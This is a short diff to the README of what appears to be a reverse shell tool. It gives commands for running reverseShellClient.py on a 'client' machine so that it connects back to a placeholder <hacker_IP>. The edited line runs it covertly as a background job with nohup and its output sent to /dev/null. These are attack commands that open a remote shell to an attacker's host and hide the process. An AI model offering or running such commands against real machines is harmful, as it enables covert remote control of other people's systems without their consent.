@@ -6,8 +6,8 @@
 ## On Client machine
 `python3 reverseShellClient.py <hacker_IP>`
 
-Or run as a backgroud job
-`nohup python3 reverseShellClient.py <hacker_ip> &> /dev/null`
+### Or run as a backgroud job
+`nohup python3 reverseShellClient.py <hacker_ip> &> /dev/null &`
 
 
 ### Port as an optional argument
